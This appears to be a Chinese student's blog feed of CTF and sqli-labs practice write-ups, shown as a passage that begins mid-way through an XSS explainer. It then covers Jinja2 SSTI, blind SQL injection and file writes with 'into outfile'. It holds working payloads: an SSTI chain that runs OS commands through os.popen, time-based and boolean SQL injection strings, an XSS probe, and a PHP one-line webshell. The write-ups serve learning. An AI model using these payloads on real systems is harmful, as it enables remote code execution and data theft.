server中，而是直接出现在了URL地址中；</p><p>2、反射型xss漏洞常见于通过URL传递参数的功能，如网站搜索、跳转等；</p><p>3、由于需要用户主动打开恶意的URL才能生效，攻击者往往会结合多种手段诱导用户点击。一般通过邮件、社交软件等方式直接发送攻击URL，通过用户的点击来达到攻击目的的。</p><p>POST的内容也可以触发反射型xss，只不过其触发条件比较苛刻，需要构造表单提交页面，并引导用户点击，所以非常少见。  </p><p>这个类型的xss攻击在生活中是我们最常见的吧，平常在qq邮箱里的未知邮件，一旦点开号就被盗了，用的就是这种xss攻击，当点击连接后用户的cookie就会被发送到攻击者手里，有了cookie就不需要账号密码登录用户了，从而实现盗号。  </p><h2 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h2><p>存储型xss，也叫“持久型xss”，相比反射型xss，存储型xss是把恶意脚本保存到了web server中的，这种攻击具有较强的稳定性和持久性，危害性也更大。这样每一个访问特定网页的用户，都会受到攻击。  </p><h3 id="存储型xss的攻击步骤："><a href="#存储型xss的攻击步骤：" class="headerlink" title="存储型xss的攻击步骤："></a>存储型xss的攻击步骤：</h3><p>1、攻击者将恶意代码提交到目标网站的数据库中；</p><p>2、用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在HTML中返回给浏览器；</p><p>3、用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行；</p><p>4、恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</p><h3 id="特点：-1"><a href="#特点：-1" class="headerlink" title="特点："></a>特点：</h3><p>1、攻击脚本持久性，保存在web server中；</p><p>2、这种攻击常见于带有用户保存数据的网站功能，一般通过论坛发帖、商品评论、用户私信等功能（所有能够向web server输入内容的地方），将攻击脚本存储到web server中。</p><p>有时候反射型xss和存储型xss是同时使用的，比如：先通过对一个攻击url进行编码（来绕过xss filter），提交到web server（存储在web server中），然后用户在浏览页面时，如果点击该url，就会触发一个xss攻击。当然用户点击该url时，也可能会触发一个CSRF（Cross site request forgery）攻击。  </p><p>##DOM型xss  </p><p>DOM（Document Object Model） –based 漏洞是基于文档对象模型的一种漏洞，通过修改页面的DOM节点而形成的xss漏洞。</p><h3 id="DOM型xss的攻击步骤："><a href="#DOM型xss的攻击步骤：" class="headerlink" title="DOM型xss的攻击步骤："></a>DOM型xss的攻击步骤：</h3><p>1、攻击者构造出特殊的URL，其中包含恶意代码。</p><p>2、用户打开带有恶意代码的URL。</p><p>3、用户浏览器接收到响应后解析执行，前端JavaScript取出URL中的恶意代码并执行。</p><p>4、恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</p><p>DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p><h3 id="特点：-2"><a href="#特点：-2" class="headerlink" title="特点："></a>特点：</h3><p>1、攻击脚本不与服务端交互的，只与客户端上的js交互，攻击脚本放到了js中执行，然后显示出来；</p><p>2、DOM型xss也是一种反射型xss。  </p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>反射型xss跟存储型xss的区别是：存储型xss非持久性，攻击脚本存在服务器里，反射型xss持久性，攻击脚本存在URL里。</p><p>DOM型xss跟前两种xss的区别：DOM型xss，是通过修改页面的DOM节点来形成xss的，取出和执行恶意代码由浏览器端完成，属于前端JavaScript自身的安全漏洞，而其他两种xss都属于服务端的安全漏洞。  </p><h1 id="三、XSS漏洞的检测"><a href="#三、XSS漏洞的检测" class="headerlink" title="三、XSS漏洞的检测"></a>三、XSS漏洞的检测</h1><p>最简单的就是通过输入xss语句来探测，比如： </p><pre><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></pre><p>如果插入的语句原封不动的呈现在了浏览器中，那么说明：<br>1、代码没有被过滤，存在xss；<br>2、代码没有被执行，因为没有闭合类似textarea标签，可以查看下源码。  </p><p>或者利用xss探针来检测。<br>xss探针可检测出网站有没有对xss漏洞做最基础的防御。<br>在测试xss的位置写入代码，查看页面源码，看看哪些代码被过滤或者转义了。</p><pre><code>&#39;&#39;;!--&quot;&lt;XSS&gt;=&amp;&#123;()&#125;  </code></pre><p>还可以使用工具来检测，例如   </p><pre><code>Arachni、Mozilla HTTP Observatory、w3af 等。   </code></pre><p>题目现在无法打开，等到恢复了再附上wp吧。  </p><h1 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h1><p>xss是我学到的一个新的攻击方式，其实就是通过插入恶意js代码来让网页执行，从而造成信息泄露，进行xss攻击，还是看如何绕过网页对于我们输入的内容的过滤。也就是如何插入代码，怎样插入代码，插入代码干什么。可以看出来，防御与绕过一直都是网站攻击的重点。关于绕过的方式，还是要不断探索和积累才行。<br>附上学习博客以便深入学习。   </p><p><a href="https://blog.csdn.net/z_z_w_/article/details/100006464?ops_request_misc=&request_id=&biz_id=102&utm_term=xxs%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-100006464.first_rank_v2_pc_rank_v29">XSS的攻击原理与防御原理</a><br><a href="https://blog.csdn.net/u014490157/article/details/39552007?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161400774616780265414822%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161400774616780265414822&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-1-39552007.first_rank_v2_pc_rank_v29&utm_term=xxs%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86">xxs攻击</a><br><a href="https://zhangqiang.blog.csdn.net/article/details/98996026?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.control&dist_request_id=ce9538e3-1ec8-46bf-9fd6-f41f124c8b18&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.control">XSS漏洞原理和利用</a></p>]]></content>
      
      
      <categories>
          
          <category> test38 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习26——SSTI模板注入</title>
      <link href="test37/undefined-undefined.html"/>
      <url>test37/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>最近有点懒，发现很久没有更新新题目了，最进学了一个新的知识点，赶紧来凭借最近做的两道题目巩固一下。  </p><h1 id="一、-BJDCTF-2nd-fake-google-1"><a href="#一、-BJDCTF-2nd-fake-google-1" class="headerlink" title="一、[BJDCTF 2nd]fake google 1"></a>一、[BJDCTF 2nd]fake google 1</h1><p>打开这道题目，发现是一个谷歌界面。让我们输入内容。<br><img src="https://i.loli.net/2021/02/21/58tEAZYQmVzeOIb.png" alt="18.png"><br>随便输入个数字，发现直接给我们回显出来了。<br><img src="https://i.loli.net/2021/02/21/mTfeAsw7M82NFDQ.png" alt="19.png"><br>并且通过网址栏可以可看出是以get方式来传参变量name。  </p><p>一开始我以为这还是个sql注入题目，但是我发现无论如何输入都是给我原封不动的回显回来，看来他考的并不是这个，那么就是一个新的知识点了。  </p><h2 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h2><p>从注入两个字可以看出它和sql注入肯定有相似地方的，确实如此，下面简单讲解一下。  </p><h3 id="1、什么是SSTI"><a href="#1、什么是SSTI" class="headerlink" title="1、什么是SSTI"></a>1、什么是SSTI</h3><p>SSTI，服务器端模板注入(Server-Side Template Injection)</p><pre><code>服务端接收攻击者的输入，将其作为Web应用模板内容的一部分在进行目标编译渲染的过程中，进行了语句的拼接，执行了所插入的恶意内容从而导致信息泄露、代码执行、GetShell等问题其影响范围主要取决于模版引擎的复杂性</code></pre><p>注意：模板引擎 和 渲染函数 本身是没有漏洞的 , 该漏洞的产生原因在于程序员对代码的不严禁与不规范 , 导致了模板可控 , 从而引发代码注入</p><p>主要的框架</p><pre><code>Python：jinja2、 mako、 tornado、 djangophp：smarty、 twigjava：jade、 velocity  </code></pre><h3 id="2、模板引擎"><a href="#2、模板引擎" class="headerlink" title="2、模板引擎"></a>2、模板引擎</h3><p>看完这个解释后我们来先讲一下什么是模板引擎。<br>简而言之，这个就相当于一个模子，它会生成一套html代码，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。具体如下图。<br><img src="https://i.loli.net/2021/02/21/tSZ5gD42blRhMNT.png" alt="20.png"><br>其中渲染是由渲染函数完成的。  </p><p>举个例子。render_template_string() 函数就是一个用于渲染函数，它可以渲染一个字符串，通过上图可以知道，当我们输入字符串后，它会和模板文件，也就是一套html代码拼接起来，然后进行渲染，最后呈现到html页面上。  </p><p>拿这道题目来说，我们输入123，这个字符串就和一套代码拼接起来了，根据回显的结果可以推测出来这套代码执行的是返回P3’s girlfirend is : +“我们输入的内容”的命令。经过拼接和渲染后呈现给我们的界面就是P3’s girlfirend is : 123这样的字符。   </p><pre><code>其实换一个角度来想，模板引擎就相当于PPT中的背景样式，当我们采用了一种背景形式后，我们只需输入我们的内容，最后所有PPT呈现出来的都是这个背景加上内容，而不需要我们专门找背景再一张张PPT设置了。  </code></pre><h3 id="3、注入原理"><a href="#3、注入原理" class="headerlink" title="3、注入原理"></a>3、注入原理</h3><p>了解完模板引擎和渲染后，漏洞在哪里呢？<br>当我们输入{ {7*7} }后，我们会发现他并不是原样返回了。而是返回了49这个数字。<br><img src="https://i.loli.net/2021/02/21/fB5NqozGQw7CHF3.png" alt="21.png"><br>很明显，{ {—-} }中的语句被执行了。<br>这是因为在flask中，渲染引擎Jinja2会将{ { — } }视为变量标识符，会将其包含的内容作为变量处理，从而包裹的语句被执行<br>那么，如果我们传入的参数内容为{ { — } }包裹的代码，这些代码就会被执行。  </p><p>看到这里是不是发现{ {—} }里的代码和sql的注入语句有些相似?它们都是通过传参来执行一些语句。    </p><p>但是虽然我们能够执行代码，但由于模板本身的沙盒安全机制，某些语句虽然可以执行，却不会执行成功，也就是说，虽然我们可以执行系统命令语句，(比如ls查看目录，cat查看文件等等)但是它并不会执行成功，这就是因为沙盒机制严格地限制了程序的行为。  </p><p>那么我们如何绕过这个机制呢？这里要用到魔术方法，并且有一套方法。<br><img src="https://i.loli.net/2021/02/21/KR83Q1NJWb4dtuL.png" alt="22.png">   </p><p>一些内建魔术方法如下<br><img src="https://i.loli.net/2021/02/21/K5ItBfLScNZAvx6.png" alt="23.png">  </p><pre><code>__class__：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。1&gt;&gt;&gt; &#39;&#39;.__class__&lt;type &#39;str&#39;&gt;2&gt;&gt;&gt; ().__class__&lt;type &#39;tuple&#39;&gt;3&gt;&gt;&gt; [].__class__&lt;type &#39;list&#39;&gt;4&gt;&gt;&gt; &#123;&#125;.__class__&lt;type &#39;dict&#39;&gt;__ bases__：用来查看类的基类，也可是使用数组索引来查看特定位置的值1&gt;&gt;&gt; ().__class__.__bases__(&lt;type &#39;object&#39;&gt;,)2&gt;&gt;&gt; &#39;&#39;.__class__.__bases__(&lt;type &#39;basestring&#39;&gt;,)3&gt;&gt;&gt; [].__class__.__bases__(&lt;type &#39;object&#39;&gt;,)4&gt;&gt;&gt; &#123;&#125;.__class__.__bases__(&lt;type &#39;object&#39;&gt;,)5&gt;&gt;&gt; [].__class__.__bases__[0]&lt;type &#39;object&#39;&gt;__mro__：也可以获取基类1&gt;&gt;&gt; &#39;&#39;.__class__.__mro__(&lt;class &#39;str&#39;&gt;, &lt;class &#39;object&#39;&gt;)2&gt;&gt;&gt; [].__class__.__mro__(&lt;class &#39;list&#39;&gt;, &lt;class &#39;object&#39;&gt;)3&gt;&gt;&gt; &#123;&#125;.__class__.__mro__(&lt;class &#39;dict&#39;&gt;, &lt;class &#39;object&#39;&gt;)4&gt;&gt;&gt; ().__class__.__mro__(&lt;class &#39;tuple&#39;&gt;, &lt;class &#39;object&#39;&gt;)5&gt;&gt;&gt; ().__class__.__mro__[1]            # 使用索引就能获取基类了&lt;class &#39;object&#39;&gt;__subclasses__()：查看当前类的子类。&gt;&gt;&gt; [].__class__.__bases__[0].__subclasses__()[&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;, &lt;type &#39;NoneType&#39;&gt;, &lt;type &#39;NotImplementedType&#39;&gt;, &lt;type &#39;traceback&#39;&gt;, &lt;type &#39;super&#39;&gt;, &lt;type &#39;xrange&#39;&gt;, &lt;type &#39;dict&#39;&gt;, &lt;type &#39;set&#39;&gt;, &lt;type &#39;slice&#39;&gt;, &lt;type &#39;staticmethod&#39;&gt;, &lt;type &#39;complex&#39;&gt;, &lt;type &#39;float&#39;&gt;, &lt;type &#39;buffer&#39;&gt;, &lt;type &#39;long&#39;&gt;, &lt;type &#39;frozenset&#39;&gt;, &lt;type &#39;property&#39;&gt;, &lt;type &#39;memoryview&#39;&gt;, &lt;type &#39;tuple&#39;&gt;, &lt;type &#39;enumerate&#39;&gt;, &lt;type &#39;reversed&#39;&gt;, &lt;type &#39;code&#39;&gt;, &lt;type &#39;frame&#39;&gt;, &lt;type &#39;builtin_function_or_method&#39;&gt;, &lt;type &#39;instancemethod&#39;&gt;, &lt;type &#39;function&#39;&gt;, &lt;type &#39;classobj&#39;&gt;, &lt;type &#39;dictproxy&#39;&gt;, &lt;type &#39;generator&#39;&gt;, &lt;type &#39;getset_descriptor&#39;&gt;, &lt;type &#39;wrapper_descriptor&#39;&gt;, &lt;type &#39;instance&#39;&gt;, &lt;type &#39;ellipsis&#39;&gt;, &lt;type &#39;member_descriptor&#39;&gt;, &lt;type &#39;file&#39;&gt;, &lt;type &#39;PyCapsule&#39;&gt;, &lt;type &#39;cell&#39;&gt;, &lt;type &#39;callable-iterator&#39;&gt;, &lt;type &#39;iterator&#39;&gt;, &lt;type &#39;sys.long_info&#39;&gt;, &lt;type &#39;sys.float_info&#39;&gt;, &lt;type &#39;EncodingMap&#39;&gt;, &lt;type &#39;fieldnameiterator&#39;&gt;, &lt;type &#39;formatteriterator&#39;&gt;, &lt;type &#39;sys.version_info&#39;&gt;, &lt;type &#39;sys.flags&#39;&gt;, &lt;type &#39;sys.getwindowsversion&#39;&gt;, &lt;type &#39;exceptions.BaseException&#39;&gt;, &lt;type &#39;module&#39;&gt;, &lt;type &#39;imp.NullImporter&#39;&gt;, &lt;type &#39;zipimport.zipimporter&#39;&gt;, &lt;type &#39;nt.stat_result&#39;&gt;, &lt;type &#39;nt.statvfs_result&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &lt;class &#39;_abcoll.Hashable&#39;&gt;, &lt;type &#39;classmethod&#39;&gt;, &lt;class &#39;_abcoll.Iterable&#39;&gt;, &lt;class &#39;_abcoll.Sized&#39;&gt;, &lt;class &#39;_abcoll.Container&#39;&gt;, &lt;class &#39;_abcoll.Callable&#39;&gt;, &lt;type &#39;dict_keys&#39;&gt;, &lt;type &#39;dict_items&#39;&gt;, &lt;type &#39;dict_values&#39;&gt;, &lt;class &#39;site._Printer&#39;&gt;, &lt;class &#39;site._Helper&#39;&gt;, &lt;type &#39;_sre.SRE_Pattern&#39;&gt;, &lt;type &#39;_sre.SRE_Match&#39;&gt;, &lt;type &#39;_sre.SRE_Scanner&#39;&gt;, &lt;class &#39;site.Quitter&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &lt;type &#39;operator.itemgetter&#39;&gt;, &lt;type &#39;operator.attrgetter&#39;&gt;, &lt;type &#39;operator.methodcaller&#39;&gt;, &lt;type &#39;functools.partial&#39;&gt;, &lt;type &#39;MultibyteCodec&#39;&gt;, &lt;type &#39;MultibyteIncrementalEncoder&#39;&gt;, &lt;type &#39;MultibyteIncrementalDecoder&#39;&gt;, &lt;type &#39;MultibyteStreamReader&#39;&gt;, &lt;type &#39;MultibyteStreamWriter&#39;&gt;]   </code></pre><p>介绍完这些魔术方法的运用后再讲一下引擎的判断，因为模板引擎分很多种，因为不同引擎支持的语句也不同，引擎的判断其实挺简单的，下面附上一张图。<br><img src="https://i.loli.net/2021/02/21/hVcfBTGsFiPR9O4.png" alt="26.png"><br><strong>绿色为执行成功，红色为执行失败</strong>  </p><pre><code>**另：&#123; &#123;7*&#39;7&#39;&#125; &#125;在Twig中返回49，在Jinja2中返回77777777**</code></pre><p>这张图还是比较清晰的。<br>这道题目的引擎是jinja2，一般来说，大多数题目都是这个引擎。  </p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>知道了SSTI后，我们来看这道题目。已经知道这道题目是SSTI注入，那么我们就一步步来吧。  </p><p>按照上面的流程。<br>1、获取字符串的类对象  </p><blockquote><p>{ {‘’.__class __} }</p></blockquote><p><img src="https://i.loli.net/2021/02/21/zHrt2Th6oyYGQEC.png" alt="23.png"><br>2、寻找基类  </p><blockquote><p>{ {‘’.__class __. __mro __} }</p></blockquote><p><img src="https://i.loli.net/2021/02/21/YL1QU4gA9BlWjFN.png" alt="1.png"><br>3、寻找可用引用，也就是可以引用os模块的子类，warnings.catch_warnings。引用这个模块可以执行系统命令。从而查询我们想要的文件。还有一个file类，也可以读文件。<br>可以引用的类其实很多。<br>object是所有类的父类，所以我们选择object来查看有什么我们是可以引用的。  </p><blockquote><p>{ {‘’.__ class <strong>.</strong> mro __[1]. __subclasses __()} }  </p></blockquote><p><img src="https://i.loli.net/2021/02/21/SuGcEKVJRxBAjQZ.png" alt="2.png"><br>好家伙，有这么多，我们要找到可以引用os模块的子类。也就是warnings.catch_warnings。<br>发现它在169位。接下来就是构造命令来执行。来查flag。  </p><pre><code>&#123; &#123;&#39;&#39;.__class__.__mro__[1].__subclasses__()[169].__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__ import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()&quot;)&#125; &#125;    __init__ 类的初始化方法__globals__ 对包含函数全局变量的字典的引用__bases__ 返回该对象所继承的基类 __builtins__是作为默认初始模块builtins指的是python的内置函数，如eval(),chr()等</code></pre><p>其实这个payload差不多都是固定，只有个别地方有调整。还是要多积累。   </p><p>还有一个jinja2引擎通用的payload。  </p><pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123; &#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('<command>').read()") &#125; &#125;&#123;% endif %&#125;&#123;% endfor %&#125;  </code></pre><p>&lt; command &gt;里填入要执行的命令。（tql）</p><p>这样就完成了SSTI注入。  </p><h1 id="二、Do-You-like-Python"><a href="#二、Do-You-like-Python" class="headerlink" title="二、Do_You_like_Python?"></a>二、Do_You_like_Python?</h1><p>这是一个新手赛里的题目，也是SSTI注入。<br>打开题目，发现就是一个提交栏。<br><img src="https://i.loli.net/2021/02/22/KoTs4ciSymk2hu1.png" alt="4.png"><br>输入{ {7*’7’} },发现返回7777777，说明这是jinja2引擎。  </p><p>直接上通用的payload。  </p><pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123; &#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls').read()") &#125; &#125;&#123;% endif %&#125;&#123;% endfor %&#125;   </code></pre><p>查看目录。<br><img src="https://i.loli.net/2021/02/22/uRqYDBLUfIJcKQr.png" alt="5.png"><br>接着查看flag文件。  </p><pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123; &#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat flag').read()") &#125; &#125;&#123;% endif %&#125;&#123;% endfor %&#125;  </code></pre><p>还是这个简单省事。   </p><p><strong>注：关于SSTI注入其实可以在用hexo上传博客时找到例子，因为hexo用的引擎是twig，它的语法也会将两个花括号视为执行的语句的标志，所以在上传的时候会报错，必须将两个括号用空格隔开才行。</strong></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>其实SSTI注入和sql注入很相似，都是通过执行一些相关语句来查看相关信息。也都有自己的一套流程。按部就班不难，难的是如何灵活应用魔法方法，和绕过一些限制，从而引用os模块或者可以利用的子类。  </p><p>SSTI注入的payload很多，要多积累，有时候有的payload是无效的，原因还不清楚。。。。。。。  </p><p>下面附上学习博客。<br><a href="https://blog.csdn.net/weixin_44604541/article/details/109048578?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161381046216780265420418%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161381046216780265420418&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-109048578.first_rank_v2_pc_rank_v29&utm_term=SSTI%E5%8E%9F%E7%90%86">SSTI详解 一文了解SSTI和所有常见payload 以flask模板为例</a><br><a href="https://blog.csdn.net/yh1013024906/article/details/84330056?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161381046216780265420418%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161381046216780265420418&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-4-84330056.first_rank_v2_pc_rank_v29&utm_term=SSTI%E5%8E%9F%E7%90%86">FLASK模板注入 （SSTI）</a></p>]]></content>
      
      
      <categories>
          
          <category> test37 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入闯关9-10与时间盲注</title>
      <link href="test36/undefined-undefined.html"/>
      <url>test36/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天来学另一个盲注——时间盲注。 </p><h1 id="Less-9——10"><a href="#Less-9——10" class="headerlink" title="Less-9——10"></a>Less-9——10</h1><p>其实时间盲注和布尔盲注原理相同，都是利用了网页回显的不同来判断数据库里的信息。<br>我们先来认识一个函数——sleep()<br>这个函数在很多地方都见过，简而言之就是相隔多长时间来响应或者执行命令，括号里面填数字，单位是秒。<br>例如:sleep(6)，那么就是六秒之后才会响应。  </p><p>这个函数就是时间盲注里最重要的函数。其余的函数和布尔盲注里的函数完全相同。  </p><p>那么接下来我们看这一关。<br>打开后我们发现无论我们怎么注入，都只会显示You are in………..这个界面，如果要用到布尔盲注，那么界面的回显就必须不同，这也就是时间盲注中sleep()函数要做到的。  </p><p>首先我们来看这个sql语句。  </p><blockquote><p>?id=1 and if(1=2,1,sleep(10))–+</p></blockquote><p>很明显，这是一个三元运算，如果if函数中第一个语句为真，那么就执行第二个语句，如果第一个语句为假，那么就执行第三个语句。  </p><p>在这个三元运算中，很明显的最终执行的是第三个语句，也就是sleep(10)，也就是说，我们构造这样一个payload，如果这关的页面发生了延迟响应，那么我们也就可以采用时间盲注的方法来代替布尔盲注。<br>开始界面是这样的。<br><img src="https://i.loli.net/2021/02/20/pHazxEt3gCUeRuo.png" alt="14.png"><br>当我们构造上面的payload后再上传后发现确实延迟回显。<br><img src="https://i.loli.net/2021/02/20/p7aYRBHeiLlTG1s.png" alt="15.png"><br>可以看到确实出现了延迟。<br>那么我们也就可以凭借是否出现延迟来判断数据库名字字符了。例如我们构建以下payload。  </p><p>判断数据库名长度。</p><blockquote><p>?id=1’ and if(length(database())&gt;1,sleep(10),1)–+</p></blockquote><p>可以看到，如果数据库名长度大于一，那么就有十秒的延迟回显，反之则没有十秒延迟。而在实际情况下确实有十秒延迟。<br><img src="https://i.loli.net/2021/02/20/QvL1ZChlgzPiyW7.png" alt="16.png"><br>后面的操作就和布尔盲注差不多相同了，只不过多了一个sleep()函数而已。  </p><p>爆库名字符。  </p><blockquote><p>?id=1’ and if(ascii(substr(database(),1,1))&gt;115, 0, sleep(10))–+</p></blockquote><p>和布尔盲注一样的，这个也需要脚本来实现，否则太难手工注入。  </p><h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h1><p>这道题同上一道一样，只不过闭合方式由单引号变为双引号，别的没有差别，不再过多赘述。</p>]]></content>
      
      
      <categories>
          
          <category> test36 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql闯关注入8</title>
      <link href="test35/undefined-undefined.html"/>
      <url>test35/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>这一关考的是布尔盲注。  </p><h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h1><p>布尔盲注在之前的博客里介绍的很清楚了，这里就不再赘述。直接看题。  </p><p>打开题目，先输入?id=1’ –+，发现回显有You are in………..这样的字符。<br><img src="https://i.loli.net/2021/02/18/Hb5a39pFnBDlRhx.png" alt="5.png"><br>然后我们再进行下一步的判断列数。发现输入order by 4时没有回显，说明有三列。<br><img src="https://i.loli.net/2021/02/18/i4s8LncparToHlB.png" alt="6.png"><br>接着我们判断回显位时发现界面输出的依旧是You are in………..<br><img src="https://i.loli.net/2021/02/18/HJhoLwblt4mfWv6.png" alt="7.png"><br>那我们再试试输入别的。输入错误的sql语句试一下。<br>输入?id=999’ union select database()–+<br><img src="https://i.loli.net/2021/02/18/H9pSarJWfVomGQL.png" alt="8.png"><br>发现没有任何回显。那么我们输入正确的看一下。<br>输入?id=999’ union select 1,2,database()–+<br><img src="https://i.loli.net/2021/02/18/HCrIZisFhwq9AJR.png" alt="9.png"><br>发现回显仍是You are in………..<br>到这里我们差不多已经知道了这一关的注入机制，当我们输入的sql语句为正确时，也就是为真时，页面会有You are in………..  的回显，当我们输入的sql语句为假时，页面便不会有回显。  </p><p>结合上面的情况，我们可以认定这是一个布尔盲注，那么我们就直接套模板来注入了。<br>判断数据库字符长度。</p><blockquote><p>?id=1’ and length((select database()))&gt;8–+</p></blockquote><p><img src="https://i.loli.net/2021/02/18/NXlWzdo1MtGKxZh.png" alt="10.png"><br>当&gt;8时无回显，可以知道数据库长度为7。  </p><p>判断数据库第一个字符。<br>我们可以根据前面的题目知道这个数据库名字是security，s的ASCII码是115，我们拿这个来测试一下。</p><blockquote><p>?id=1’ and ascii(substr((select database()),1,1))&gt;115–+</p></blockquote><p><img src="https://i.loli.net/2021/02/18/HUtnlLzrQ2j6P1s.png" alt="11.png"><br>当判定ASCII码大于115时报错，符合我们的预期。  </p><blockquote><p>?id=1’ and ascii(substr((select database()),1,1))&gt;114–+<br>?id=1’ and ascii(substr((select database()),1,1))=115–+</p></blockquote><p><img src="https://i.loli.net/2021/02/18/5YmakgSVly2LQde.png" alt="12.png"><br><img src="https://i.loli.net/2021/02/18/TJojd3U8s1IFnwm.png" alt="13.png"><br>当判定&gt;114和=115说回显正常，说明布尔盲注是可以的，这个模板是没问题的。<br>那么接下来就按流程走了。已知数据库名字，爆表名，然后爆列名，爆数据，这个过程使用脚本是最简单的，人力注入工作量太大了。</p>]]></content>
      
      
      <categories>
          
          <category> test35 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql闯关练习7</title>
      <link href="test34/undefined-undefined.html"/>
      <url>test34/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天把sql闯关给补一下。  </p><h1 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h1><p>这一关注入的方法其实在原理上并不难理解，就是上传一句话木马来连接数据库。<br>一句话木马已经很熟悉了，既然它可以在上传文件时造成漏洞，从而获取网站后台信息文件，那么它也可以用于sql注入中，这里就要用到一个新的命令来上传文件。  </p><h2 id="into-outfile命令与路径"><a href="#into-outfile命令与路径" class="headerlink" title="into outfile命令与路径"></a>into outfile命令与路径</h2><p>into outfile命令是一个可以将查询结果输出保存到一个文件中的命令，也就是向数据库写入一个文件，但是要想执行这个命令就必须要知道网站的在系统中的具体路径（绝对路径)。而这个语句的样式如下：  </p><blockquote><p>select “<?php @eval($_POST['123]);?>“ into outfile “XXX\test.php” </p></blockquote><p>那么怎么知道绝对路径呢？这里介绍两个参数：<br>@@datadir 读取数据库路径<br>@@basedir MYSQL 获取安装路径<br>这两个参数在MySQL的配置中都能找到，而这两个参数在sql注入中可以回显出数据库和安装的路径。这样我们就不难得到网站路径了。  </p><hr><p>这里补充一下各个系统的网站默认路径。<br>winserver的iis默认路径c:\Inetpub\wwwroot</p><p>linux的nginx一般是/usr/local/nginx/html，/home/wwwroot/default，/usr/share/nginx，/var/www/htm等</p><p>apache 就…/var/www/htm，…/var/www/html/htdocs</p><p>phpstudy 就是…\PhpStudy20180211\PHPTutorial\WWW\</p><p>xammp 就是…\xampp\htdocs  </p><hr><p>那么现在我们正式开始解决这一关。<br>首先试出闭合方式是id=5’))，并且是字符型注入，接着查出只有三列，<br>但是在这一关无论怎么尝试发现都没有办法回显，那么我们就我们就无法查出数据库路径和安装路径。  </p><p>但是我们可以知道之前那些关是可以成功回显的，所以我用之前的关卡查出了路径。<br><img src="https://i.loli.net/2021/02/16/4urUPCqBIv3nZcE.png" alt="4.png">  </p><p>得到路径后我们就可以结合前面的小扩展猜出网站的绝对路径。（这个其实在电脑上自己就能找出来，因为是本地安装的phpstudy。）  